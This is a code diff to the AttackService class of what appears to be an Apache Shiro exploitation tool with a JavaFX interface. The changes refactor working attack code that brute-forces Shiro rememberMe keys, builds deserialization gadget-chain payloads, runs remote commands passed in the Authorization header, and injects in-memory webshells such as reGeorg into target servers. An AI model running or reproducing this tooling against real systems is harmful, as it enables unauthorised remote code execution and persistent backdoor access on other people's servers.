@@ -25,6 +25,7 @@ import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import javafx.application.Platform;
 import javafx.collections.ObservableList;
 import org.apache.commons.lang.StringUtils;
 import org.apache.shiro.codec.Base64;
@@ -76,53 +77,47 @@ public class AttackService {
         return combineHeaders;
     }
 
+    private String hutoolRequest(HashMap<String, String> headers, String body) {
+        String cookieVal = headers.remove("Cookie");
+        Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
+        cn.hutool.http.HttpRequest req;
+        if ("POST".equalsIgnoreCase(this.method)) {
+            req = cn.hutool.http.HttpRequest.post(this.url);
+            if (body != null && !body.isEmpty())
+                req.body(body, "application/x-www-form-urlencoded");
+        } else {
+            req = cn.hutool.http.HttpRequest.get(this.url);
+        }
+        req.timeout(this.timeout);
+        if (cookieVal != null) req.cookie(cookieVal);
+        if (proxy != null) req.setProxy(proxy);
+        req.headerMap(headers, true);
+        req.setFollowRedirects(false);
+        cn.hutool.http.HttpResponse resp = req.execute();
+        String result = resp.toString();
+        resp.close();
+        return result;
+    }
+
     public String headerHttpRequest(HashMap<String, String> header) {
         String result = null;
         HashMap combineHeaders = this.getCombineHeaders(header);
-        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
         try {
-/*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-            return result;*/
-/*            if (result.contains("Host")){
-                return result;
-            }*/
-            if (this.method.equals("GET")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-
-            } else {
-//                result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", this.postData, combineHeaders, this.timeout);
-//                result = bodyHttpRequest(combineHeaders, this.postData);
-                result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
-                System.out.println(result);
-
-            }
+            result = hutoolRequest(combineHeaders, this.postData);
         } catch (Exception var5) {
             this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
         }
-
-
         return result;
     }
 
     public String bodyHttpRequest(HashMap<String, String> header, String postString) {
         String result = "";
         HashMap combineHeaders = this.getCombineHeaders(header);
-        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
         try {
-
-            if (postString.equals("")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-                if (result.contains("Host")){
-                    return result;
-                }
-                result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
-            } else if (!result.contains("Host") | !this.method.equals("GET")) {
-                result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
-            }
+            result = hutoolRequest(combineHeaders, postString);
         } catch (Exception var6) {
             this.mainController.logTextArea.appendText(Utils.log(var6.getMessage()));
         }
-
         return result;
     }
 
@@ -179,39 +174,68 @@ public class AttackService {
             if (rememberMe != null) {
                 HashMap header = new HashMap();
                 header.put("Cookie", rememberMe + ";");
-//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
-                if (result.contains("Host")) {
-                    this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
-                    this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
-                    this.mainController.gadgetOpt.setValue(gadgetOpt);
-                    this.mainController.echoOpt.setValue(echoOpt);
+                if (result != null && result.contains("Host")) {
+                    Platform.runLater(() -> {
+                        this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
+                        this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
+                        this.mainController.gadgetOpt.setValue(gadgetOpt);
+                        this.mainController.echoOpt.setValue(echoOpt);
+                    });
                     gadget = gadgetOpt;
                     attackRememberMe = rememberMe;
                     flag = true;
                 } else {
-                    this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
+                    Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt)));
                 }
+            } else {
+                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> payload 构造失败")));
             }
-        } catch (Exception var8) {
-            this.mainController.logTextArea.appendText(Utils.log(var8.getMessage()));
+        } catch (Throwable var8) {
+            String msg = var8.getMessage();
+            if (msg == null || msg.trim().isEmpty()) {
+                msg = var8.getClass().getName();
+            }
+            final String finalMsg = msg;
+            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> " + finalMsg)));
         }
 
         return flag;
+    }
+
+    private Class<?> resolvePayloadClass(String gadgetOpt) {
+        if (gadgetOpt == null || gadgetOpt.trim().isEmpty()) {
+            return null;
+        }
+        String className = gadgetOpt.substring(0, 1).toUpperCase() + gadgetOpt.substring(1);
+        try {
+            return Class.forName("com.summersec.attack.deser.payloads." + className);
+        } catch (Throwable ignored) {
+            return null;
+        }
     }
 
     public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey) {
         String rememberMe = null;
 
         try {
-            Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
+            Class<?> gadgetClazz = resolvePayloadClass(gadgetOpt);
+            if (gadgetClazz == null) {
+                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("未找到利用链类: " + gadgetOpt)));
+                return null;
+            }
             ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
             Object template = Gadgets.createTemplatesImpl(echoOpt);
             Object chainObject = gadgetPayload.getObject(template);
             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
-        } catch (Exception var9) {
+        } catch (Throwable var9) {
             var9.printStackTrace();
-            this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
+            String msg = var9.getMessage();
+            if (msg == null || msg.trim().isEmpty()) {
+                msg = var9.getClass().getName();
+            }
+            final String finalMsg = msg;
+            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log(finalMsg)));
         }
 
         return rememberMe;
@@ -338,19 +362,21 @@ public class AttackService {
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
                             if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
-                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.mainController.shiroKey.setText(shirokey);
+                                Platform.runLater(() -> {
+                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
+                                    AttackService.this.mainController.shiroKey.setText(shirokey);
+                                });
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey)));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage())));
                         }
 
                     }
-                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));
+                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -374,19 +400,21 @@ public class AttackService {
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
                             if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
-                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.mainController.shiroKey.setText(shirokey);
+                                Platform.runLater(() -> {
+                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
+                                    AttackService.this.mainController.shiroKey.setText(shirokey);
+                                });
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey)));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage())));
                         }
 
                     }
-                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));
+                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -396,61 +424,71 @@ public class AttackService {
         thread.start();
     }
     public void execCmdTask(String command) {
-        HashMap<String, String> header = new HashMap();
-        header.put("Cookie", attackRememberMe);
-        String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
-        header.put("Authorization", "Basic "+b64Command);
-        String responseText = this.bodyHttpRequest(header, "");
-        String result = responseText.split("\\$\\$\\$")[1];
-        if (!result.equals("")) {
-            byte[] b64bytes = Base64.decode(result);
-
+        new Thread(() -> {
             try {
-                String defaultEncode = Utils.guessEncoding(b64bytes);
-                this.mainController.execOutputArea.appendText(new String(b64bytes, defaultEncode));
-                this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------"+ "\n");
-            } catch (UnsupportedEncodingException var8) {
-                this.mainController.execOutputArea.appendText(new String(b64bytes) + "\n");
+                HashMap<String, String> header = new HashMap();
+                header.put("Cookie", attackRememberMe);
+                String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
+                header.put("Authorization", "Basic " + b64Command);
+                String responseText = this.bodyHttpRequest(header, "");
+                String[] parts = responseText.split("\\$\\$\\$");
+                if (parts.length > 1 && !parts[1].equals("")) {
+                    byte[] b64bytes = Base64.decode(parts[1]);
+                    try {
+                        String defaultEncode = Utils.guessEncoding(b64bytes);
+                        String output = new String(b64bytes, defaultEncode);
+                        Platform.runLater(() -> {
+                            this.mainController.execOutputArea.appendText(output);
+                            this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------\n");
+                        });
+                    } catch (UnsupportedEncodingException var8) {
+                        String output = new String(b64bytes);
+                        Platform.runLater(() -> this.mainController.execOutputArea.appendText(output + "\n"));
+                    }
+                } else {
+                    Platform.runLater(() -> this.mainController.execOutputArea.appendText(Utils.log("命令已执行,返回为空")));
+                }
+            } catch (Throwable e) {
+                String msg = e.getMessage();
+                Platform.runLater(() -> this.mainController.execOutputArea.appendText(Utils.log("[-] " + msg)));
             }
-        } else {
-            this.mainController.execOutputArea.appendText(Utils.log("命令已执行,返回为空"));
-        }
-
+        }).start();
     }
 
     public void injectMem(String memShellType, String shellPass, String shellPath) {
-        String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
-        if (injectRememberMe != null) {
-            HashMap<String, String> header = new HashMap();
-            header.put("Cookie", injectRememberMe);
-            header.put("p", shellPass);
-            header.put("path", shellPath);
-
+        new Thread(() -> {
             try {
+                String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
+                if (injectRememberMe == null) return;
+                HashMap<String, String> header = new HashMap();
+                header.put("Cookie", injectRememberMe);
+                header.put("p", shellPass);
+                header.put("path", shellPath);
+
                 String b64Bytecode = MemBytes.getBytes(memShellType);
                 String postString = "user=" + b64Bytecode;
                 String result = this.bodyHttpRequest(header, postString);
-                if (result.contains("->|Success|<-")) {
-                    String httpAddress = Utils.UrlToDomain(this.url);
-                    this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
-                    this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
-                    if (!memShellType.equals("reGeorg[Servlet]")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                Platform.runLater(() -> {
+                    if (result.contains("->|Success|<-")) {
+                        String httpAddress = Utils.UrlToDomain(this.url);
+                        this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
+                        this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
+                        if (!memShellType.equals("reGeorg[Servlet]")) {
+                            this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                        }
+                    } else {
+                        if (result.contains("->|") && result.contains("|<-")) {
+                            this.mainController.InjOutputArea.appendText(Utils.log(result));
+                        }
+                        this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
                     }
-                } else {
-                    if (result.contains("->|") && result.contains("|<-")) {
-                        this.mainController.InjOutputArea.appendText(Utils.log(result));
-                    }
-
-                    this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
-                }
-            } catch (Exception var10) {
-                this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
+                    this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
+                });
+            } catch (Throwable e) {
+                String msg = e.getMessage();
+                Platform.runLater(() -> this.mainController.InjOutputArea.appendText(Utils.log("[-] " + msg)));
             }
-
-            this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
-        }
-
+        }).start();
     }
 
     public static void main(String[] args) {
